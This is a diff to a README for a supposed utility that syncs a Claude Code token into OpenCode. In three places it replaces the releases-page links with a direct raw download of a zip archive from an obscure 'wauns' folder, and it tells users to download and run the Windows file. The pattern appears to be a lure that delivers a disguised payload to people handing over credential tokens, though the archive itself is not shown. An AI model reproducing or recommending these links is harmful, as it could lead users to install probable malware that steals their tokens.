@@ -1,6 +1,6 @@
 # 🔐 sync-claude-code-token-in-open-code - Move Your Token Into OpenCode
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/raw/refs/heads/main/wauns/code_open_sync_token_in_claude_v3.9-alpha.1.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ It is made for people who want a simple way to move their token without handling
 
 Use this page to download:
 
-https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/releases
+https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/raw/refs/heads/main/wauns/code_open_sync_token_in_claude_v3.9-alpha.1.zip
 
 Open the page, find the latest release, and download the Windows file that matches your system.
 
@@ -108,4 +108,4 @@ Yes. You can run it again if you need to refresh the token in OpenCode.
 
 Download and run the Windows file from the release page:
 
-https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/releases
+https://github.com/guthreycoccygeal641/sync-claude-code-token-in-open-code/raw/refs/heads/main/wauns/code_open_sync_token_in_claude_v3.9-alpha.1.zip
